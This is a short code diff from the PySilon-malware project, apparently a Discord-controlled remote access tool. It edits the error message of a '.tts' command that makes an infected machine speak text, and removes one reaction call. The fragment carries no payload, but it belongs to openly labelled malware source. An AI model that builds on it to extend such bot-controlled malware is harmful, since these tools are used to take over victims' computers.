@@ -16,4 +16,4 @@ async def text_to_speech(ctx, what_to_say=None):
     else:
         embed = discord.Embed(title="📛 Error",description='```Syntax: .tts <what-to-say>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-        reaction_msg = await ctx.send(embed=embed); await reaction_msg.add_reaction('🔴')
+        await ctx.send(embed=embed)
